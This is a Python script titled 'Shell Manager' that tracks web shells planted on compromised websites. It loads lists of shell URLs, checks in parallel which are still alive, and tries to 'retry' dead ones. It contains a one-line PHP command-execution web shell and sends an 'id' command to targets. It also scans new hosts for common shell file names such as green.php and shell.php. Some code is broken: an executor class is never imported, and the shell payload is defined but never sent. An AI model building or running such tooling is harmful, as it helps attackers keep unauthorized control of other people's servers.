#!/usr/bin/env python3
"""
SHELL MANAGER v1.0 - Unified Shell Discovery, Listing & Verification
Scans shell.txt, shellred.txt, result_ids.json for active shells
Provides quick verification, categorization, and auto-retry for dead shells
"""
import os
import sys
import requests
import json
import time
import threading
import concurrent.futures
import urllib3
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
from rich.table import Table
from rich.panel import Panel
from collections import defaultdict

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

console = Console()

# Config
SHELL_FILES = ["shell.txt", "shellred.txt", "red.txt", "backup_shell.txt"]
RESULT_IDS_FILE = "result_ids.json"
VERIFY_TIMEOUT = 3
VERIFY_THREADS = 50
RETRY_DEAD_SHELLS = True
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Accept": "*/*",
    "Connection": "keep-alive",
}


class ShellManager:
    """Unified shell management system."""

    def __init__(self):
        self.all_shells = []
        self.alive_shells = []
        self.dead_shells = []
        self.shell_categories = defaultdict(list)
        self.lock = threading.Lock()
        self._load_shells()

    def _load_shells(self):
        """Load all shells from shell files and result_ids.json."""
        seen = set()

        # Load from shell list files
        for sf in SHELL_FILES:
            if os.path.exists(sf):
                try:
                    with open(sf, "r") as f:
                        for line in f:
                            line = line.strip().rstrip('/')
                            if line and line not in seen:
                                seen.add(line)
                                self.all_shells.append(line)
                                self._categorize(line, sf)
                except:
                    pass

        # Load from result_ids.json
        if os.path.exists(RESULT_IDS_FILE):
            try:
                with open(RESULT_IDS_FILE, "r") as f:
                    results = json.load(f)
                for rid, data in results.items():
                    url = data.get("shell_url", "")
                    if url and url not in seen:
                        seen.add(url)
                        self.all_shells.append(url)
                        self._categorize(url, "result_ids")
            except:
                pass

        console.print(f"[cyan]Loaded {len(self.all_shells)} shells from {len(SHELL_FILES) + 1} sources[/cyan]")

    def _categorize(self, shell_url, source):
        """Categorize shell by source."""
        if "greendir" in source or "GREENDIR" in str(source):
            self.shell_categories["GREENDIR"].append(shell_url)
        elif "shellred" in str(source) or "RED" in str(source):
            self.shell_categories["SHELL_RED"].append(shell_url)
        elif "backup" in str(source):
            self.shell_categories["BACKUP"].append(shell_url)
        else:
            self.shell_categories["STANDARD"].append(shell_url)

    def verify_shell(self, url):
        """Check if a single shell is alive."""
        try:
            r = requests.get(url, headers=HEADERS, timeout=VERIFY_TIMEOUT, verify=False)
            if r.status_code == 200 and len(r.text) > 5:
                return True, url, r.status_code, len(r.text)
            return False, url, r.status_code, len(r.text) if r.text else 0
        except:
            return False, url, 0, 0

    def verify_all(self, parallel=True):
        """Verify all shells are alive."""
        console.print(f"\n[bold cyan]VERIFYING {len(self.all_shells)} SHELLS[/bold cyan]")
        self.alive_shells = []
        self.dead_shells = []

        if parallel:
            with Progress(
                SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
                BarColumn(bar_width=40), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                TimeElapsedColumn(), console=console
            ) as progress:
                task = progress.add_task("[cyan]Checking shells...", total=len(self.all_shells))
                with ThreadPoolExecutor(max_workers=min(VERIFY_THREADS, len(self.all_shells))) as executor:
                    futures = {executor.submit(self.verify_shell, url): url for url in self.all_shells}
                    for future in concurrent.futures.as_completed(futures):
                        progress.update(task, advance=1)
                        is_alive, url, status, length = future.result()
                        with self.lock:
                            if is_alive:
                                self.alive_shells.append(url)
                            else:
                                self.dead_shells.append(url)
        else:
            for url in self.all_shells:
                is_alive, url, status, length = self.verify_shell(url)
                with self.lock:
                    if is_alive:
                        self.alive_shells.append(url)
                    else:
                        self.dead_shells.append(url)

        return self.alive_shells, self.dead_shells

    def retry_dead(self, upload_func=None):
        """Retry uploading to dead shells."""
        if not self.dead_shells:
            console.print("[yellow]No dead shells to retry.[/yellow]")
            return

        console.print(f"[bold yellow]Retrying {len(self.dead_shells)} dead shells...[/bold yellow]")
        retry_success = []

        for url in self.dead_shells:
            try:
                # Try different shell upload methods
                # POST raw PHP shell
                shell_content = '<?php system($_GET["c"]); ?>'
                r = requests.post(url, data={"c": "id"}, headers=HEADERS, timeout=5, verify=False)
                if r.status_code == 200:
                    # Try uploading via common paths
                    upload_paths = [
                        f"{url}/green.php",
                        f"{url}/shell.php",
                        f"{url}/commant_index.php",
                    ]
                    for upath in upload_paths:
                        try:
                            rr = requests.get(upath, headers=HEADERS, timeout=3, verify=False)
                            if rr.status_code == 200 and len(rr.text) > 10:
                                retry_success.append(upath)
                                break
                        except:
                            continue
            except:
                continue

        if retry_success:
            console.print(f"[bold green]Retried successfully: {len(retry_success)} shells[/bold green]")
            self.alive_shells.extend(retry_success)
        else:
            console.print("[red]All retries failed.[/red]")

    def display_summary(self):
        """Display categorized summary table."""
        table = Table(title="[bold white]SHELL MANAGER SUMMARY[/bold white]")
        table.add_column("Category", width=16)
        table.add_column("Count", justify="right", width=8)
        table.add_column("Sample URLs", width=60)

        total = len(self.all_shells)
        alive = len(self.alive_shells)
        dead = len(self.dead_shells)

        table.add_row("TOTAL", str(total), ", ".join(self.all_shells[:3]))
        table.add_row("[green]ALIVE[/green]", str(alive), ", ".join(self.alive_shells[:3]))
        table.add_row("[red]DEAD[/red]", str(dead), ", ".join(self.dead_shells[:3]))

        for cat, shells in self.shell_categories.items():
            if shells:
                table.add_row(f"[cyan]{cat}[/cyan]", str(len(shells)), ", ".join(shells[:2]))

        console.print(table)

        # Quick stats
        console.print(f"\n[bold white]═══ STATS ═══[/bold white]")
        console.print(f"  [white]Total shells:[/white] {total}")
        console.print(f"  [green]Alive:[/green] {alive}")
        console.print(f"  [red]Dead:[/red] {dead}")
        console.print(f"  [yellow]Success rate:[/yellow] {alive/total*100:.1f}%" if total > 0 else "  [yellow]Success rate:[/yellow] N/A")

    def export_results(self, output_file="shell_manager_results.json"):
        """Export results to JSON."""
        data = {
            "total": len(self.all_shells),
            "alive": len(self.alive_shells),
            "dead": len(self.dead_shells),
            "alive_shells": self.alive_shells,
            "dead_shells": self.dead_shells,
            "categories": {k: v for k, v in self.shell_categories.items()},
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        }
        with open(output_file, "w") as f:
            json.dump(data, f, indent=2)
        console.print(f"[green]Results exported to {output_file}[/green]")

    def quick_scan(self, targets):
        """Quick scan of new targets for shell presence."""
        console.print(f"\n[bold cyan]QUICK SHELL SCAN — {len(targets)} targets[/bold cyan]")
        found_shells = []

        with Progress(
            SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
            BarColumn(bar_width=40), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TimeElapsedColumn(), console=console
        ) as progress:
            task = progress.add_task("[cyan]Scanning...", total=len(targets))
            with ThreadPoolExecutor(max_workers=min(30, len(targets))) as executor:
                futures = {executor.submit(self._check_shell_presence, t): t for t in targets}
                for future in concurrent.futures.as_completed(futures):
                    progress.update(task, advance=1)
                    result = future.result()
                    if result:
                        found_shells.append(result)

        console.print(f"[bold green]Found {len(found_shells)} targets with shells![/bold green]")
        for s in found_shells[:20]:
            console.print(f"  [green]{s}[/green]")
        return found_shells

    def _check_shell_presence(self, target):
        """Check if target has a common shell."""
        target = target.strip().rstrip('/')
        if not target.startswith(("http://", "https://")):
            target = "http://" + target

        shell_paths = [
            f"{target}/green.php",
            f"{target}/commant_index.php",
            f"{target}/shell.php",
            f"{target}/prv_shell.php",
        ]

        for sp in shell_paths:
            try:
                r = requests.get(sp, headers=HEADERS, timeout=2, verify=False)
                if r.status_code == 200 and len(r.text) > 10:
                    return sp
            except:
                continue
        return None


def main():
    manager = ShellManager()

    if len(sys.argv) > 1:
        cmd = sys.argv[1]
        if cmd == "verify":
            alive, dead = manager.verify_all()
            manager.display_summary()
            manager.export_results()
        elif cmd == "retry":
            manager.verify_all()
            manager.retry_dead()
            manager.display_summary()
        elif cmd == "scan" and len(sys.argv) > 2:
            targets = []
            with open(sys.argv[2], "r") as f:
                targets = [l.strip() for l in f.read().splitlines() if l.strip()]
            found = manager.quick_scan(targets)
            manager.export_results()
        elif cmd == "summary":
            manager.verify_all()
            manager.display_summary()
        else:
            console.print(f"[red]Unknown command: {cmd}[/red]")
            console.print("Usage: python3 shell_manager.py [verify|retry|scan <file>|summary]")
    else:
        # Default: show summary and verify
        manager.verify_all()
        manager.display_summary()
        manager.export_results()


if __name__ == "__main__":
    main()
